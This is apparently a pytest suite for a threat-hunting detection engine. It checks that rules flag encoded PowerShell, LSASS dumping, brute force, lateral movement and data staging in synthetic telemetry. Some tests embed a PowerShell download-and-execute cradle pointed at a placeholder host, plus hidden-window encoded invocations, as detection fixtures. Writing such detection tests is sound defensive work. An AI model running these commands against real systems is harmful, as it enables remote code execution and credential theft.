"""Tests for the deterministic hunting layer.

Test philosophy for detection engineering: every rule needs **both** halves.

* a *true positive* test -- the rule fires on the behaviour it claims to detect
* a *true negative* test -- the rule stays quiet on the benign majority

A rule with only the first test is indistinguishable from ``return everything``.

Ground truth is used **here** (and only here) to assert that detections land on the
right events. Detection code itself never reads it.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path

import pandas as pd
import pytest

from ath.config import PROJECT_ROOT
from ath.hunting import (
    Evidence,
    Finding,
    HuntConfig,
    Severity,
    all_detectors,
    get_detector,
    registered_rule_ids,
    run_hunt,
)
from ath.hunting.indicators import (
    decode_powershell_b64,
    extract_encoded_command,
    find_download_indicators,
    find_evasion_flags,
    is_prefix_of_encoded_command,
    is_public_ip,
)
from ath.hunting.rules.logon_rules import _find_bursts
from ath.telemetry import (
    GeneratorConfig,
    generate_telemetry,
    write_telemetry,
)
from ath.telemetry.generator import encode_powershell
from ath.telemetry.loader import load_ground_truth, load_telemetry

UTC = timezone.utc


# ======================================================================================
# Fixtures
# ======================================================================================


@pytest.fixture(scope="module")
def data_dir(tmp_path_factory) -> Path:
    """Generate and persist a telemetry set once for the whole module."""
    tables, ground_truth = generate_telemetry(GeneratorConfig())
    out = tmp_path_factory.mktemp("hunt_data")
    write_telemetry(tables, ground_truth, out)
    return out


@pytest.fixture(scope="module")
def telemetry(data_dir):
    return load_telemetry(data_dir)


@pytest.fixture(scope="module")
def ground_truth(data_dir) -> dict:
    return load_ground_truth(data_dir)


@pytest.fixture(scope="module")
def attack_ids(ground_truth) -> set[str]:
    return set(ground_truth["scenarios"]["intrusion"]["event_ids"])


@pytest.fixture(scope="module")
def benign_lookalike_ids(ground_truth) -> set[str]:
    return set(ground_truth["scenarios"]["benign_lookalike"]["event_ids"])


@pytest.fixture(scope="module")
def hunt(telemetry):
    return run_hunt(telemetry)


def stage_ids(ground_truth: dict, scenario: str, stage: str) -> set[str]:
    """Return the event ids labelled for one stage of one scenario."""
    return set(ground_truth["scenarios"][scenario]["stages"][stage]["event_ids"])


# ======================================================================================
# Indicator helpers
# ======================================================================================


@pytest.mark.parametrize(
    "flag,expected",
    [("e", True), ("en", True), ("enc", True), ("encodedcommand", True),
     ("EncodedCommand", True), ("command", False), ("exec", False), ("", False)],
)
def test_encoded_command_prefix_matching(flag: str, expected: bool) -> None:
    """PowerShell accepts any unambiguous prefix; the rule must too."""
    assert is_prefix_of_encoded_command(flag) is expected


@pytest.mark.parametrize("flag", ["-e", "-en", "-enc", "-EncodedCommand", "/enc"])
def test_extract_encoded_command_handles_all_abbreviations(flag: str) -> None:
    blob = encode_powershell("Write-Host hello world from a longer script")
    assert extract_encoded_command(f"powershell.exe {flag} {blob}") == blob


def test_extract_encoded_command_ignores_other_flags() -> None:
    """-ExecutionPolicy and -Command must not be mistaken for -EncodedCommand."""
    cmd = r"powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\inventory.ps1"
    assert extract_encoded_command(cmd) is None
    assert extract_encoded_command("powershell.exe -Command Get-ChildItem") is None


def test_decode_powershell_b64_uses_utf16le() -> None:
    script = "IEX (New-Object Net.WebClient).DownloadString('http://example.test/a.ps1')"
    assert decode_powershell_b64(encode_powershell(script)) == script


def test_decode_powershell_b64_rejects_garbage() -> None:
    assert decode_powershell_b64("not!valid!base64") is None
    assert decode_powershell_b64("") is None


def test_find_evasion_flags() -> None:
    flags = find_evasion_flags("powershell.exe -nop -w hidden -enc AAAA")
    assert "hidden window" in flags and "no profile" in flags
    # -NonInteractive is ordinary automation and must NOT count as evasion.
    assert find_evasion_flags("powershell.exe -NonInteractive -File x.ps1") == []


def test_find_download_indicators() -> None:
    found = find_download_indicators("IEX (New-Object Net.WebClient).DownloadString('http://x')")
    assert "downloadstring" in found and "iex" in found
    assert find_download_indicators("Get-ChildItem C:\\Users") == []


@pytest.mark.parametrize(
    "ip,public",
    [("185.220.101.47", True), ("8.8.8.8", True),
     ("10.10.20.15", False), ("192.168.1.1", False), ("172.16.0.1", False),
     ("127.0.0.1", False), ("169.254.1.1", False), ("", False), ("garbage", False)],
)
def test_is_public_ip(ip: str, public: bool) -> None:
    assert is_public_ip(ip) is public


# ======================================================================================
# Finding model
# ======================================================================================


def _evidence(n: int = 1) -> tuple[Evidence, ...]:
    base = datetime(2026, 8, 17, 9, 0, tzinfo=UTC)
    return tuple(
        Evidence(f"evt-{i:06d}", base + timedelta(minutes=i), f"summary {i}")
        for i in range(1, n + 1)
    )


def test_finding_requires_evidence() -> None:
    """A finding with no evidence is an assertion, not a detection."""
    with pytest.raises(ValueError, match="must cite at least one event"):
        Finding(
            rule_id="ATH-999", title="t", severity=Severity.LOW,
            device="PC01", user="jdoe", evidence=(), reason="r",
        )


def test_finding_derives_event_ids_and_window() -> None:
    f = Finding(
        rule_id="ATH-999", title="t", severity=Severity.HIGH,
        device="PC01", user="jdoe", evidence=_evidence(3), reason="r",
    )
    assert f.event_ids == ("evt-000001", "evt-000002", "evt-000003")
    assert f.first_seen < f.last_seen
    assert f.event_count == 3


def test_finding_sorts_evidence_chronologically() -> None:
    ev = _evidence(3)
    f = Finding(
        rule_id="ATH-999", title="t", severity=Severity.HIGH,
        device="PC01", user="jdoe", evidence=(ev[2], ev[0], ev[1]), reason="r",
    )
    assert f.event_ids == ("evt-000001", "evt-000002", "evt-000003")


def test_finding_to_dict_is_json_safe() -> None:
    import json

    f = Finding(
        rule_id="ATH-999", title="t", severity=Severity.MEDIUM,
        device="PC01", user="jdoe", evidence=_evidence(2), reason="r",
        metadata={"count": pd.NA if False else 5, "ts": pd.Timestamp("2026-08-17", tz="UTC")},
    )
    json.dumps(f.to_dict())  # must not raise


def test_severity_ranking() -> None:
    assert Severity.CRITICAL.rank > Severity.HIGH.rank > Severity.MEDIUM.rank
    assert Severity.LOW.rank > Severity.INFO.rank


# ======================================================================================
# Registry and engine
# ======================================================================================


def test_all_ten_rules_registered() -> None:
    """ATH-009/010 were added by the Milestone 6 detection-engineering loop."""
    assert registered_rule_ids() == [
        "ATH-001", "ATH-002", "ATH-003", "ATH-004", "ATH-005",
        "ATH-006", "ATH-007", "ATH-008", "ATH-009", "ATH-010",
    ]


def test_every_rule_declares_its_metadata() -> None:
    """Undeclared fields/false positives would let caveats vanish from reports."""
    for det in all_detectors():
        assert det.rule_id and det.title and det.description
        assert det.fields_used, f"{det.rule_id} declares no fields_used"
        assert det.false_positives, f"{det.rule_id} declares no false_positives"


def test_unknown_rule_id_raises() -> None:
    with pytest.raises(KeyError, match="Unknown rule"):
        get_detector("ATH-999")


def test_hunt_runs_all_rules_without_error(hunt) -> None:
    assert hunt.errors == {}
    assert len(hunt.rules_run) == 10


def test_every_finding_cites_real_event_ids(hunt, telemetry) -> None:
    """The core traceability guarantee the whole project rests on."""
    known = set(
        pd.concat(
            [telemetry.processes["event_id"], telemetry.network["event_id"],
             telemetry.logons["event_id"]]
        )
    )
    for finding in hunt.findings:
        assert set(finding.event_ids) <= known, f"{finding.rule_id} cites unknown events"


def test_findings_sorted_by_severity(hunt) -> None:
    ranks = [f.severity.rank for f in hunt.findings]
    assert ranks == sorted(ranks, reverse=True)


def test_min_severity_filter(telemetry) -> None:
    result = run_hunt(telemetry, min_severity=Severity.HIGH)
    assert all(f.severity.rank >= Severity.HIGH.rank for f in result.findings)
    assert result.finding_count < run_hunt(telemetry).finding_count


def test_rule_filter_runs_only_that_rule(telemetry) -> None:
    result = run_hunt(telemetry, rule_ids=["ATH-001"])
    assert result.rules_run == ["ATH-001"]
    assert {f.rule_id for f in result.findings} == {"ATH-001"}


def test_detection_never_reads_ground_truth() -> None:
    """Static check: no rule module may import or reference ground truth.

    This is the architectural guarantee that the detections are not grading their own
    homework, enforced by the test suite rather than by discipline.

    The check parses the AST rather than grepping the raw text, so a docstring that
    *mentions* the rule is not mistaken for code that *breaks* it -- the analysis has
    to look at what the code does, not what it says.
    """
    import ast

    hunting_dir = PROJECT_ROOT / "src" / "ath" / "hunting"
    for path in hunting_dir.rglob("*.py"):
        tree = ast.parse(path.read_text(encoding="utf-8"))

        # Collect docstring nodes so they can be excluded from the scan.
        docstrings = {
            node.body[0].value
            for node in ast.walk(tree)
            if isinstance(node, (ast.Module, ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef))
            and node.body
            and isinstance(node.body[0], ast.Expr)
            and isinstance(node.body[0].value, ast.Constant)
            and isinstance(node.body[0].value.value, str)
        }

        offenders: list[str] = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Name) and "ground_truth" in node.id.lower():
                offenders.append(node.id)
            elif isinstance(node, ast.Attribute) and "ground_truth" in node.attr.lower():
                offenders.append(node.attr)
            elif isinstance(node, ast.alias) and "ground_truth" in node.name.lower():
                offenders.append(node.name)
            elif (
                isinstance(node, ast.Constant)
                and isinstance(node.value, str)
                and node not in docstrings
                and "ground_truth" in node.value.lower()
            ):
                offenders.append(node.value)

        assert not offenders, f"{path.name} references ground truth in code: {offenders}"


# ======================================================================================
# ATH-001 -- Office spawns interpreter
# ======================================================================================


def test_ath001_detects_word_spawning_powershell(hunt, ground_truth) -> None:
    findings = hunt.by_rule("ATH-001")
    assert len(findings) == 1
    expected = stage_ids(ground_truth, "intrusion", "2-execution")
    assert set(findings[0].event_ids) == expected
    assert findings[0].device == "PC01"
    assert findings[0].severity is Severity.HIGH


def test_ath001_ignores_benign_office_and_powershell(telemetry) -> None:
    """Outlook->Word and explorer->PowerShell are both normal and must not fire."""
    procs = telemetry.processes
    assert (procs["parent_process_name"] == "OUTLOOK.EXE").sum() > 0
    assert (procs["process_name"] == "powershell.exe").sum() > 50  # plenty of benign PS
    findings = run_hunt(telemetry, rule_ids=["ATH-001"]).findings
    assert len(findings) == 1  # only the macro chain


# ======================================================================================
# ATH-002 -- Encoded PowerShell
# ======================================================================================


def test_ath002_detects_and_decodes_the_stager(hunt, ground_truth) -> None:
    findings = [f for f in hunt.by_rule("ATH-002") if f.device == "PC01"]
    assert len(findings) == 1
    finding = findings[0]
    assert set(finding.event_ids) == stage_ids(ground_truth, "intrusion", "2-execution")
    assert finding.severity is Severity.HIGH  # payload downloads remote code
    decoded = finding.metadata["decoded_command"]
    assert "DownloadString" in decoded and "185.220.101.47" in decoded


def test_ath002_grades_benign_encoded_powershell_lower(hunt, benign_lookalike_ids) -> None:
    """The IT inventory script is encoded too -- it must not be treated as HIGH."""
    findings = [f for f in hunt.by_rule("ATH-002") if f.device == "PC07"]
    assert len(findings) == 1
    assert findings[0].severity is Severity.LOW
    assert set(findings[0].event_ids) <= benign_lookalike_ids
    assert findings[0].metadata["download_indicators"] == []


def test_ath002_does_not_fire_on_plain_powershell(telemetry) -> None:
    findings = run_hunt(telemetry, rule_ids=["ATH-002"]).findings
    encoded_count = telemetry.processes["command_line"].str.contains(
        "-enc |-EncodedCommand ", regex=True, na=False
    ).sum()
    assert len(findings) == encoded_count == 2


# ======================================================================================
# ATH-003 -- Interpreter external connection
# ======================================================================================


def test_ath003_groups_beacon_into_one_finding(hunt, ground_truth) -> None:
    findings = [f for f in hunt.by_rule("ATH-003") if f.device == "PC01"]
    assert len(findings) == 1, "a beacon must not produce one alert per connection"
    finding = findings[0]
    assert finding.metadata["remote_ip"] == "185.220.101.47"
    assert finding.event_count == 7          # 1 download + 6 beacons
    assert finding.metadata["cleartext_http"] is True
    assert finding.severity is Severity.HIGH
    expected = (
        stage_ids(ground_truth, "intrusion", "3-payload-download")
        | stage_ids(ground_truth, "intrusion", "4-command-and-control")
    )
    assert set(finding.event_ids) == expected


def test_ath003_ignores_internal_and_browser_traffic(telemetry) -> None:
    """Chrome and Teams talk externally constantly; only interpreters should fire."""
    findings = run_hunt(telemetry, rule_ids=["ATH-003"]).findings
    assert all(
        f.metadata["remote_ip"] not in ("10.10.10.20", "10.10.10.10", "10.10.10.30")
        for f in findings
    )
    assert len(findings) == 3  # PC01 C2, FS02 egress, PC07 false positive


def test_ath003_allowlist_suppresses_the_false_positive(telemetry) -> None:
    """Tuning is configuration, not a code change."""
    config = HuntConfig(allowed_external_destinations=frozenset({"20.190.160.14"}))
    findings = run_hunt(telemetry, rule_ids=["ATH-003"], config=config).findings
    assert not any(f.device == "PC07" for f in findings)
    assert any(f.device == "PC01" for f in findings)  # real detection survives


# ======================================================================================
# ATH-004 -- LSASS credential access
# ======================================================================================


def test_ath004_detects_comsvcs_minidump(hunt, ground_truth) -> None:
    findings = hunt.by_rule("ATH-004")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.severity is Severity.CRITICAL
    assert set(finding.event_ids) == stage_ids(
        ground_truth, "intrusion", "6-credential-access"
    )
    assert "comsvcs.dll MiniDump" in finding.metadata["indicators"]


def test_ath004_silent_on_clean_telemetry(telemetry) -> None:
    """Strip the one malicious command line; the rule must produce nothing."""
    clean = telemetry.processes[
        ~telemetry.processes["command_line"].str.contains("comsvcs", case=False, na=False)
    ]
    stripped = type(telemetry)(
        processes=clean, network=telemetry.network, logons=telemetry.logons
    )
    assert get_detector("ATH-004").run(stripped) == []


# ======================================================================================
# ATH-005 -- Brute force
# ======================================================================================


def test_ath005_detects_burst_and_the_success(hunt, ground_truth) -> None:
    findings = hunt.by_rule("ATH-005")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.severity is Severity.CRITICAL  # because a success followed
    assert finding.metadata["failure_count"] == 14
    assert finding.metadata["succeeded"] is True
    assert finding.metadata["source_device"] == "PC01"
    assert set(finding.event_ids) == stage_ids(ground_truth, "intrusion", "7-brute-force")


def test_ath005_ignores_ordinary_password_typos(telemetry) -> None:
    """Every benign user mistypes then succeeds -- same shape, harmless magnitude."""
    findings = run_hunt(telemetry, rule_ids=["ATH-005"]).findings
    assert all(f.user == "svc_backup" for f in findings)


def test_ath005_threshold_is_the_tuning_knob(telemetry) -> None:
    """Lowering the threshold floods the analyst with benign typo bursts."""
    noisy = HuntConfig(bruteforce_min_failures=1)
    findings = run_hunt(telemetry, rule_ids=["ATH-005"], config=noisy).findings
    assert len(findings) > 5
    assert any(f.user != "svc_backup" for f in findings)


def test_ath005_high_not_critical_without_a_success(telemetry) -> None:
    """Remove the successful logon; severity must drop."""
    logons = telemetry.logons
    burst_success = logons[
        (logons["user"] == "svc_backup")
        & (logons["action"] == "success")
        & (logons["device"] == "FS02")
    ]
    trimmed = logons[~logons["event_id"].isin(burst_success["event_id"])]
    stripped = type(telemetry)(
        processes=telemetry.processes, network=telemetry.network, logons=trimmed
    )
    findings = get_detector("ATH-005").run(stripped)
    assert len(findings) == 1
    assert findings[0].severity is Severity.HIGH
    assert findings[0].metadata["succeeded"] is False


def test_find_bursts_sliding_window() -> None:
    """A burst straddling a clock boundary must still be found."""
    base = pd.Timestamp("2026-08-17 09:58:00", tz="UTC")
    stamps = [base + timedelta(seconds=30 * i) for i in range(10)]  # 09:58 -> 10:02:30
    assert _find_bursts(stamps, 10, timedelta(minutes=10)) == [(0, 9)]
    assert _find_bursts(stamps, 11, timedelta(minutes=10)) == []
    assert _find_bursts([], 5, timedelta(minutes=10)) == []


def test_find_bursts_are_non_overlapping() -> None:
    base = pd.Timestamp("2026-08-17 09:00:00", tz="UTC")
    stamps = [base + timedelta(minutes=i) for i in range(6)]
    assert _find_bursts(stamps, 3, timedelta(minutes=2)) == [(0, 2), (3, 5)]


# ======================================================================================
# ATH-006 -- Foreign-host authentication
# ======================================================================================


def test_ath006_detects_credential_use_from_foreign_host(hunt, ground_truth) -> None:
    findings = hunt.by_rule("ATH-006")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.user == "svc_backup"
    assert finding.metadata["source_device"] == "PC01"
    assert finding.metadata["source_host_owners"] == ["jdoe"]


def test_ath006_does_not_fire_on_admin_touching_many_hosts(hunt) -> None:
    """The naive 'N distinct hosts' rule would flag adm_sarah. Ownership modelling
    correctly does not, because she is authenticating from her own workstation."""
    assert not any(f.user == "adm_sarah" for f in hunt.by_rule("ATH-006"))


def test_ath006_ignores_users_on_their_own_machines(hunt) -> None:
    for finding in hunt.by_rule("ATH-006"):
        assert finding.user not in finding.metadata["source_host_owners"]


# ======================================================================================
# ATH-007 -- Remote service execution
# ======================================================================================


def test_ath007_detects_psexec_style_shell(hunt, ground_truth) -> None:
    findings = hunt.by_rule("ATH-007")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.device == "FS02"
    assert finding.metadata["admin_share_redirect"] is True
    assert finding.severity is Severity.HIGH
    assert set(finding.event_ids) == stage_ids(
        ground_truth, "intrusion", "8-lateral-movement"
    )


def test_ath007_ignores_normal_service_children(telemetry) -> None:
    """services.exe legitimately starts Defender and the patch agent many times."""
    procs = telemetry.processes
    service_children = procs[procs["parent_process_name"] == "services.exe"]
    assert len(service_children) > 30
    assert len(run_hunt(telemetry, rule_ids=["ATH-007"]).findings) == 1


# ======================================================================================
# ATH-008 -- Data staging
# ======================================================================================


def test_ath008_detects_bulk_archive_to_staging_path(hunt, ground_truth) -> None:
    findings = hunt.by_rule("ATH-008")
    assert len(findings) == 1
    finding = findings[0]
    assert finding.device == "FS02"
    assert finding.metadata["bulk_source"] and finding.metadata["staging_destination"]
    assert finding.severity is Severity.HIGH
    assert set(finding.event_ids) == stage_ids(ground_truth, "intrusion", "9-collection")


def test_ath008_ignores_single_file_compression(telemetry) -> None:
    """Zipping one document to your own Documents folder is normal."""
    extra = telemetry.processes.iloc[[0]].copy()
    extra["event_id"] = "evt-999999"
    extra["command_line"] = (
        r"powershell.exe -c Compress-Archive -Path C:\Users\jdoe\Documents\report.docx "
        r"-DestinationPath C:\Users\jdoe\Documents\report.zip"
    )
    augmented = type(telemetry)(
        processes=pd.concat([telemetry.processes, extra], ignore_index=True),
        network=telemetry.network,
        logons=telemetry.logons,
    )
    findings = get_detector("ATH-008").run(augmented)
    assert "evt-999999" not in {eid for f in findings for eid in f.event_ids}


# ======================================================================================
# Detection quality against ground truth (evaluation only)
# ======================================================================================


def test_detections_cover_the_whole_attack_chain(hunt, ground_truth) -> None:
    """Every stage that our rules claim to cover must actually be detected.

    As of the Milestone 6 detection-engineering loop, ATH-009/ATH-010 closed the two
    gaps (Initial Access, Discovery) that Milestones 1-3 explicitly left open. All ten
    labelled stages must now be covered.
    """
    detected = {eid for f in hunt.findings for eid in f.event_ids}
    stages = ground_truth["scenarios"]["intrusion"]["stages"]
    covered = {
        name for name, stage in stages.items()
        if detected & set(stage["event_ids"])
    }
    assert covered == set(stages)


def test_precision_is_reasonable(hunt, attack_ids, benign_lookalike_ids) -> None:
    """Most flagged events should belong to the intrusion, and every unlabelled
    event we flag should be scrutinised -- here there are none."""
    flagged = {eid for f in hunt.findings for eid in f.event_ids}
    true_positives = flagged & attack_ids
    known_benign = flagged & benign_lookalike_ids
    unexplained = flagged - attack_ids - benign_lookalike_ids

    assert len(true_positives) >= 25
    assert len(known_benign) == 2, "the IT look-alike should trip exactly ATH-002/003"
    assert unexplained == set(), f"unexplained detections: {sorted(unexplained)}"


# ======================================================================================
# pandas / KQL parity
# ======================================================================================


def test_every_rule_has_a_kql_file() -> None:
    """Guards against the two layers drifting apart as rules are added."""
    queries = PROJECT_ROOT / "queries"
    for rule_id in registered_rule_ids():
        matches = list(queries.glob(f"{rule_id}-*.kql"))
        assert len(matches) == 1, f"{rule_id} has {len(matches)} KQL files, expected 1"


def test_kql_files_reference_their_pandas_implementation() -> None:
    """Each KQL file must name the pandas class it mirrors, so the pair stays linked."""
    queries = PROJECT_ROOT / "queries"
    for path in queries.glob("ATH-*.kql"):
        text = path.read_text(encoding="utf-8")
        assert "Pandas  :" in text, f"{path.name} does not reference its pandas rule"
        assert "pandas equivalent" in text.lower(), f"{path.name} lacks a translation note"
